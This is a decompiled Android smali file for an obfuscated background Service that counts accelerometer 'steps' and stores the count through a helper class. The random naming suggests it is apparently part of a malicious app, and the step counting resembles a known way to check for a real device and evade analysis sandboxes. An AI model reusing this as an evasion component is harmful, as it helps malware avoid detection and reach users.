.class public Lwocwvy/czyxoxmbauu/slsa/blyvffs;
.super Landroid/app/Service;

# interfaces
.implements Landroid/hardware/SensorEventListener;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/b;

.field private b:I

.field private c:[F

.field private d:[F

.field private e:[F

.field private f:I

.field private g:[F

.field private h:J

.field private i:F

.field private j:Landroid/hardware/SensorManager;

.field private k:Landroid/hardware/Sensor;

.field private l:J

.field private m:F

.field private n:F

.field private o:F


# direct methods
.method public constructor <init>()V
    .locals 3

    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const/4 v0, 0x0

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->b:I

    const/16 v1, 0x32

    new-array v2, v1, [F

    iput-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->c:[F

    new-array v2, v1, [F

    iput-object v2, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->d:[F

    new-array v1, v1, [F

    iput-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->e:[F

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->f:I

    const/16 v0, 0xa

    new-array v0, v0, [F

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->g:[F

    const-wide/16 v0, 0x0

    iput-wide v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->h:J

    const/4 v2, 0x0

    iput v2, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->i:F

    iput-wide v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->l:J

    return-void
.end method


# virtual methods
.method public a()V
    .locals 5

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "step"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v0

    add-int/lit8 v0, v0, 0x1

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v2, "step"

    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, ""

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, p0, v2, v0}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->a:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v1, "Step"

    const-string v2, "+"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method public onAccuracyChanged(Landroid/hardware/Sensor;I)V
    .locals 0

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    new-instance p1, Ljava/lang/UnsupportedOperationException;

    const-string v0, "Not Yet Implemented"

    invoke-direct {p1, v0}, Ljava/lang/UnsupportedOperationException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 3

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "sensor"

    invoke-virtual {p0, v0}, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/hardware/SensorManager;

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->k:Landroid/hardware/Sensor;

    const/4 v2, 0x3

    invoke-virtual {v0, p0, v1, v2}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/hardware/SensorManager;->getDefaultSensor(I)Landroid/hardware/Sensor;

    move-result-object v0

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->k:Landroid/hardware/Sensor;

    return-void
.end method

.method public onSensorChanged(Landroid/hardware/SensorEvent;)V
    .locals 9

    iget-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->k:Landroid/hardware/Sensor;

    const/4 v2, 0x3

    invoke-virtual {v0, p0, v1, v2}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    iget-object v0, p1, Landroid/hardware/SensorEvent;->sensor:Landroid/hardware/Sensor;

    iget-object v1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    invoke-virtual {v1, p0, v0, v2}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    invoke-virtual {v0}, Landroid/hardware/Sensor;->getType()I

    move-result v0

    const/4 v1, 0x1

    if-ne v0, v1, :cond_1

    iget-object p1, p1, Landroid/hardware/SensorEvent;->values:[F

    const/4 v0, 0x0

    aget v0, p1, v0

    aget v1, p1, v1

    const/4 v2, 0x2

    aget p1, p1, v2

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    iget-wide v4, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->l:J

    sub-long v6, v2, v4

    const-wide/16 v4, 0x64

    cmp-long v8, v6, v4

    if-lez v8, :cond_1

    iget-wide v4, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->l:J

    sub-long v6, v2, v4

    iput-wide v2, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->l:J

    add-float v2, v0, v1

    add-float/2addr v2, p1

    iget v3, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->m:F

    sub-float/2addr v2, v3

    iget v3, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->n:F

    sub-float/2addr v2, v3

    iget v3, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->o:F

    sub-float/2addr v2, v3

    invoke-static {v2}, Ljava/lang/Math;->abs(F)F

    move-result v2

    long-to-float v3, v6

    div-float/2addr v2, v3

    const v3, 0x461c4000    # 10000.0f

    mul-float v2, v2, v3

    const/high16 v3, 0x44160000    # 600.0f

    cmpl-float v2, v2, v3

    if-lez v2, :cond_0

    invoke-virtual {p0}, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->a()V

    :cond_0
    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->m:F

    iput v1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->n:F

    iput p1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->o:F

    :cond_1
    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    const-string p1, "sensor"

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/hardware/SensorManager;

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    iget-object p2, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->k:Landroid/hardware/Sensor;

    const/4 p3, 0x3

    invoke-virtual {p1, p0, p2, p3}, Landroid/hardware/SensorManager;->registerListener(Landroid/hardware/SensorEventListener;Landroid/hardware/Sensor;I)Z

    iget-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->j:Landroid/hardware/SensorManager;

    const/4 p2, 0x1

    invoke-virtual {p1, p2}, Landroid/hardware/SensorManager;->getDefaultSensor(I)Landroid/hardware/Sensor;

    move-result-object p1

    iput-object p1, p0, Lwocwvy/czyxoxmbauu/slsa/blyvffs;->k:Landroid/hardware/Sensor;

    return p2
.end method
